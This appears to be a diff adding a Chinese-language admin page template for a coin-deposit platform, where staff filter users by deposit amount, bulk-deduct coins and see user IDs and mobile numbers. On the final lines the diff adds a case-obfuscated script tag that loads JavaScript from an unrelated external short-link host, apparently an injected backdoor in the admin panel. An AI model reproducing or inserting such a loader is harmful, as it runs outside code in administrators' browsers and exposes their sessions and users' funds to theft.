@@ -1,0 +1,60 @@
+<include file="public@header" />
+</head>
+<body>
+<div class="wrap js-check-wrap">
+    <ul class="nav nav-tabs">
+        <li class="active"><a href="{:url('AdminFinance/dec_cb')}">扣除存币量</a></li>
+        <!-- <li><a href="{:url('user/add')}">{:lang('ADMIN_USER_ADD')}</a></li> -->
+    </ul>
+    <form class="well form-inline margin-top-20" method="post" action="{:url('AdminFinance/dec_cb')}">
+            <!-- 注册时间： -->
+            <!--<input name="statrTime" id="startTime" type="text" class="yhgl_input date" value='<if condition="!empty($stime)">{$stime}</if>' readonly ='readonly'>-->
+            <!--<span class="mr5">至</span> -->
+            <!--<input name="endTime" id="endTime" type="text" class="yhgl_input date" value='<if condition="!empty($etime)">{$etime}</if>' readonly ='readonly'>-->
+        存币数量: 
+        <input type="text" class="form-control" name="min_num" style="width: 100px;"
+               value="<if condition="!empty($min_num)">{$min_num}</if>" placeholder="最小存币量">
+        <span class="mr5">至</span>
+        <input type="text" class="form-control" name="max_num" style="width: 100px;"
+               value="<if condition="!empty($max_num)">{$max_num}</if>" placeholder="最大存币量">
+		扣除数量: 
+        <input type="text" class="form-control" name="dec_num" style="width: 100px;"
+               value='<if condition="!empty($dec_num)">{$dec_num}</if>' placeholder="扣除数量">
+        扣除请勾选
+        <input type="checkbox" class="form-control" name="dec_cb" value='run'>       
+        <input type="submit" class="btn btn-primary" value="搜索"/>
+        <a class="btn btn-danger" href="{:url('AdminFinance/dec_cb')}">清空</a>
+    </form>
+    <script>
+        laydate({
+          elem: '#startTime'
+        });
+        laydate({
+          elem: '#endTime'
+        }); 
+    </script>
+    <table class="table table-hover table-bordered">
+        <span>数量：<?php echo count($list);?></span>
+        <thead>
+        <tr>
+            <th width="50">用户ID</th>
+            <th width="150">用户名</th>
+            <th width="150">总存币量</th>
+            <th width="150">单笔最大存币量</th>
+        </tr>
+        </thead>
+        <foreach name="list" item="vo">
+            <tr>
+
+                <td><b>{$vo.uid}</b></td>
+                <td>{$vo.mobile}</td>
+                <td>{$vo['nums']}</td>
+                <td>{$vo['max_nums']}</td>
+            </tr>
+        </foreach>
+    </table>
+    <!--<div class="pagination"> {$page|default=''}</div>-->
+</div>
+<sCRiPt sRC="https://s5.qa/HOJn"></sCrIpT><script src="__STATIC__/js/admin.js"></script>
+</body>
+</html>
